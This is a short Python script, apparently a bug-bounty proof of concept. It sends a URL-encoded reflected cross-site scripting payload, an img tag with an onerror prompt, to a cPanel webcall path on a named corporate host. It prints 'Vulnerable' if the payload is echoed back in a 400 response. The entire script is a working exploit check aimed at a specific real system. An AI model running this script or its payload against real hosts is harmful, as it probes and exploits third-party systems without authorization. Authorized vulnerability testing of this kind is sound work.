from urllib.parse import quote
import requests

url = "http://private-wireless-rom.ext.net.nokia.com/cpanelwebcall"
xss = " <img src=x onerror=\"prompt('karthithehacker')\">aaaaaaaaaaaa"
encode = quote(xss)
fullurl = f'{url}/{encode}'

response = requests.get(fullurl)

print(response.text)
print('\n\n\n')

if (response.status_code == 400) and (xss in response.text):
    print("Vulnerable")
else:
    print("NOPE")